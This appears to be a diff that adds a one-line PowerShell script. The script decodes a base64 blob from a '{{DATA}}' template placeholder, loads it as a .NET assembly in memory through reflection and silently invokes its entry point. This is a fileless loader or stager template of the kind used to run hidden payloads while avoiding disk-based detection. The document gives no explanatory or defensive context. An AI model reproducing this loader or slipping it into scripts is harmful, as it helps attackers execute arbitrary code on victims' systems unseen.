@@ -1,0 +1,1 @@
+﻿$a=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("{{DATA}}"));$a.EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null
